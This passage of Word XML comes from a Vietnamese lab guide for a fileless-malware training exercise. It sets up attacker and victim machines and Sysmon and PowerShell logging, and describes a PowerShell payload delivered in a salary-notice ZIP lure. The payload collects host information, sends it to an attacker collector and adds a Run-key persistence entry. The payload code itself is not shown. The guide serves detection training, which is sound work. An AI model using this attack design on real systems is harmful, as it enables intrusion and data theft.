        <w:t>3. Môi trường lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ATTACKER</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Windows thật</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>IP: 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>File:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C:\Fileless-Lab\payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  C:\Fileless-Lab\ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Service:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Python static server :8000  (host ZIP và payload.ps1)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Python collector server :8001 (nhận POST /collect)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>VICTIM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Windows VM</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>IP: 192.168.141.140</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Công cụ:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Event Viewer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra kết nối từ victim:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ping 192.168.141.1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Chuẩn bị logging trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1. Kiểm tra Sysmon</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Get-Service Sysmon*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nếu đã cài đúng sẽ thấy service Sysmon đang chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ta quan tâm:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event ID 1: Process Creation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event ID 3: Network Connection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event ID 11: File Create.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2. Bật hoặc kiểm tra PowerShell Script Block Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Mở:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Win + R</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu máy không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>gpedit.msc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>, cài bằng CMD Administrator:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FOR %i IN ("%SystemRoot%\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientFolder-Package~*.mum") DO (DISM /Online /NoRestart /Add-Package:"%i")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau đó vào:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Computer Configuration</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Administrative Templates</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Windows Components</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Turn on PowerShell Script Block Logging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chọn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Enabled</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cập nhật policy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gpupdate /force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Log nằm tại:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Event ID 4104.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3. Bật Process Creation Audit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chạy PowerShell Administrator:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>auditpol /set /subcategory:"Process Creation" /success:enable</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>auditpol /get /subcategory:"Process Creation"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau đó có thể quan sát:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Security Event ID 4688.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Chuẩn bị attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1. Tạo thư mục</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên attacker:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>mkdir C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd C:\Fileless-Lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2. Tạo payload campaign v2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tạo file:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab\payload.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể copy file mẫu từ:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>D:\fileless malware\lab-files\attacker-web\payload.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload v3 thực hiện các chức năng an toàn sau:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Thu thập thông tin máy không nhạy cảm: hostname, username, domain/workgroup, OS version, PowerShell version, PID và IP nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Gửi JSON profile về attacker qua </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu mất mạng hoặc collector không chạy, lưu JSON profile tạm vào </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lần chạy sau nếu có mạng lại, gửi các file trong queue về attacker rồi xóa queue đã gửi thành công.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Tạo Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để mô phỏng persistence và retry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chú ý:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
